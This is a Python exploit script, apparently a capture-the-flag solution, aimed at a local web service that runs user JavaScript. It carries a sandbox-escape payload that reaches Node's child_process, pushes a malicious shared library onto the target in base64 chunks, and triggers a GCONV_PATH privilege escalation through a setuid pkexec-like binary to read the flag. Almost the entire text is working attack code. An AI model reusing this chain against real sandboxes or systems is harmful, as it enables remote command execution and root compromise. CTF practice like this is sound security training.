import requests
import base64
import time

URL = "http://127.0.0.1:41715"
SID = "29888e2f02c32acc6016066350784122"

def run_cmd(cmd):
    payload = f'new Proxy({{}},{{get(){{return function(a){{b=Reflect.ownKeys(a.__proto__)[4];c=a[b](decodeURI("return %70rocess"))();return a(c.mainModule[b]._load(decodeURI("child_%70rocess")).execSync("{cmd}"))}}}}}})'
    
    r = requests.post(f"{URL}/api/run",
                      headers={"X-Session-Id": SID, "Content-Type": "application/json"},
                      json={"code": payload})
    
    if r.status_code != 204:
        return None
    
    result = ""
    cursor = 0
    while True:
        r = requests.get(f"{URL}/api/run",
                         headers={"X-Session-Id": SID},
                         params={"cursor": cursor})
        if r.status_code != 200:
            break
        char = r.json().get("char", "")
        if not char:
            break
        result += char
        cursor += 1
    return result

print("[1] Reading .so file...")
with open("gconv_pwn.so", "rb") as f:
    so_b64 = base64.b64encode(f.read()).decode()
print(f"    Length: {len(so_b64)}")

# 清空
run_cmd("rm -f /tmp/p.b64 /tmp/gconv_pwn.so")

# 每块 10 字符
chunk_size = 10
total = len(so_b64)
for i in range(0, total, chunk_size):
    chunk = so_b64[i:i+chunk_size]
    run_cmd(f"printf '%s' '{chunk}' >> /tmp/p.b64")
    if i % 1000 == 0:
        print(f"  Progress: {i}/{total}")

print("[2] Decoding...")
run_cmd("base64 -d /tmp/p.b64 > /tmp/gconv_pwn.so")

# 验证
size = run_cmd("wc -c < /tmp/gconv_pwn.so")
print(f"    Size: {size} bytes")

# 创建配置
print("[3] Creating gconv-modules...")
run_cmd("echo 'module UTF-8// PWN// gconv_pwn 1' > /tmp/gconv-modules")

# 触发
print("[4] Triggering...")
run_cmd("GCONV_PATH=/tmp /usr/local/bin/omni_pkexec")
time.sleep(1)

# 读 flag
print("[5] Reading flag...")
flag = run_cmd("cat /tmp/flag.txt 2>/dev/null") or run_cmd("cat /flag 2>/dev/null")
print(f"\n[+] FLAG: {flag}")